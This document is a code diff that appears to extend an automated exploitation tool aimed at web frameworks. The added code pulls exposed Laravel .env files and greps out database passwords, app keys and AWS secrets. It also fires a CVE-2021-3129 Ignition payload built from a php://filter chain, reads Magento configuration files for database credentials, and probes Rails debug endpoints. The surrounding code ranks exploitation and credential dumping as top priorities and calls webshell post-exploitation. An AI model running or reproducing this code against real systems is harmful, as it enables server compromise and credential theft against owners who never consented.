@@ -12657,6 +12657,74 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                 if "uid=" in drupal_out:
                     self._webshell_postexploit(target, f"{base}/drupal_shell.php", accumulated_output)
 
+            # ── Laravel Debug RCE + .env exposure ─────────────────────────
+            laravel_out, _ = self._run_cmd(
+                f"laravel-debug-{port_num}",
+                f"# Check Laravel debug mode and .env\n"
+                f"R=$(curl -sk --max-time 8 '{base}/' 2>/dev/null | head -50); "
+                f"echo \"$R\" | grep -qiE 'laravel|artisan|livewire|inertia' && echo 'LARAVEL_DETECTED'; "
+                f"CODE=$(curl -sk --max-time 6 -o /dev/null -w '%{{http_code}}' '{base}/.env' 2>/dev/null); "
+                f"[ \"$CODE\" = '200' ] && curl -sk --max-time 8 '{base}/.env' 2>/dev/null | "
+                f"grep -E 'APP_KEY=|DB_PASSWORD=|AWS_SECRET|MAIL_PASSWORD|REDIS_PASSWORD' | head -10; "
+                f"# Check for Ignition RCE CVE-2021-3129\n"
+                f"curl -sk --max-time 8 -X POST '{base}/_ignition/execute-solution' "
+                f"-H 'Content-Type: application/json' "
+                f"-d '{{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\","
+                f"\"parameters\":{{\"variableName\":\"pwn\",\"viewFile\":\"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource={base}/storage/logs/laravel.log\"}}}}' "
+                f"2>/dev/null | head -5",
+                target, timeout=25,
+            )
+            if "LARAVEL_DETECTED" in laravel_out or "APP_KEY=" in laravel_out:
+                self._capture_evidence(laravel_out, target, f"laravel-{port_num}", "Laravel debug/env")
+                accumulated_output.append(f"=== Laravel {base} ===\n{laravel_out[:600]}")
+                if "APP_KEY=" in laravel_out or "DB_PASSWORD=" in laravel_out:
+                    self._save_findings([{
+                        "title": f"Laravel — .env con Credenciales Expuesto @ {base}",
+                        "severity": "critical",
+                        "description": f"Laravel .env accesible públicamente:\n{laravel_out[:400]}",
+                        "cve": "",
+                    }], target)
+
+            # ── Magento admin detection ────────────────────────────────────
+            mg_detect, _ = self._run_cmd(
+                f"magento-detect-{port_num}",
+                f"curl -sk --max-time 8 -I '{base}/admin_' 2>/dev/null | head -5; "
+                f"curl -sk --max-time 8 -I '{base}/downloader/' 2>/dev/null | head -5; "
+                f"curl -sk --max-time 8 '{base}/' 2>/dev/null | grep -qiE 'magento|mage' && echo MAGENTO_DETECTED",
+                target, timeout=20,
+            )
+            if "MAGENTO_DETECTED" in mg_detect or "200" in mg_detect:
+                mg_out, _ = self._run_cmd(
+                    f"magento-rce-{port_num}",
+                    f"# Magento SUPEE path traversal\n"
+                    f"curl -sk --max-time 8 '{base}/app/etc/local.xml' 2>/dev/null | "
+                    f"grep -E 'username|password|dbname|host' | head -10; "
+                    f"curl -sk --max-time 8 '{base}/app/etc/env.php' 2>/dev/null | "
+                    f"grep -E 'username|password|dbname|host' | head -10",
+                    target, timeout=20,
+                )
+                if mg_out.strip():
+                    accumulated_output.append(f"=== Magento {base} ===\n{mg_out[:400]}")
+                    self._capture_evidence(mg_out, target, f"magento-{port_num}", "Magento config")
+
+            # ── Rails debug mode (Werkzeug-like) ──────────────────────────
+            rails_out, _ = self._run_cmd(
+                f"rails-debug-{port_num}",
+                f"curl -sk --max-time 8 '{base}/rails/info/properties' 2>/dev/null | "
+                f"grep -E 'Rails|Ruby|Rack' | head -5; "
+                f"curl -sk --max-time 8 '{base}/rails/mailers' 2>/dev/null | "
+                f"grep -q 'Rails' && echo 'RAILS_DEBUG_ACTIVE'; "
+                f"curl -sk --max-time 8 '{base}/webpack/assets' 2>/dev/null | head -3",
+                target, timeout=15,
+            )
+            if "RAILS_DEBUG_ACTIVE" in rails_out:
+                self._save_findings([{
+                    "title": f"Ruby on Rails — Debug Mode Activo @ {base}",
+                    "severity": "high",
+                    "description": "Rails debug mode expone /rails/info/properties con versión, rutas y configuración. Posible RCE via console.",
+                    "cve": "",
+                }], target)
+
     # ─────────────────────────────────────────────────────────────────────────
     # Web content fuzzing (feroxbuster / gobuster)
     # ─────────────────────────────────────────────────────────────────────────
